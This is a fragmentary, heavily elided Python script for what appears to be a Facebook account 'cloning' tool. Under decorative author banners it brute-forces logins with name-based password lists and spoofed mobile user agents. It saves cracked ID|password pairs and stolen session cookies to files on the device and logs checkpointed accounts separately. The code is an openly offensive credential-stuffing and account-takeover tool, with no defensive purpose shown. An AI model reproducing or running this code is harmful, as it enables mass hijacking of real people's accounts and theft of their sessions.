...
---------------------------------------------
  ...
  \033[2;34m┌──────────────────────────────────────────────┐
\033[1;31m │\33[37;41m\t     MR-N0OB FILE CLONING VERSION   \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 
 '\033[1;33m'┌────────────────────────────────────────────────┐
 '\033[1;33m'│'\033[2;35m'➣\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m MR-𝙰𝙻𝙸
'\033[1;33m'│\033[2;34m'➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m ARFAN AHAMED RAFI
 '\033[1;33m'│'\033[2;35m'➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m [+994 408844208]
 '\033[1;33m'│\033[2;34m'➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m Ornob-143
 '\033[1;33m'└────────────────────────────────────────────────┘\n""")                                          
  print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
  print(f"")
  print(f" \033[1;31m'  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
...
'\033[1;31m'══════════════════════════════════════════       
'\033[2;34m'══════════════════════════════════════════
'\033[1;31m'[-] TOOLS TYPE:\033[1;33m FREE
'\033[1;33m'[-] VERSION   :\033[1;32m 1.0
'\033[1;33m'[-] AUTHOR    :\033[1;32m ARIF HOSEN 𝙰𝙻𝙸
'\033[1;33m'[-] GITHUB    :\033[1;32m 𝙰𝙻𝙸-ZIllZ0
'\033[1;31m'[-] FACEBOOK  :\033[1;32m ARIF HOSEN
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS 𝙰𝙻𝙸 BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
def linex():
        print('\033[1;37m-----------------------------------------')
def clear():
        os.system('clear')
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@ZIllZ0_CK.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                in ['1','01']:
                                        ...
                                        plist.append('first lastlast123')
                                        ...
                                        plist.append('998877665544332211')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;96m@ZIllZ0\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@ZIllZ0-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@ZIllZ0-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@ZIllZ0-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@ZIllZ0-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZ0-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@ZIllZ0] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@ZIllZ0-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZ0-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@ZIllZ0-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@ZIllZ0-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@ZIllZ0OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@ZIllZ0-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZ0-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
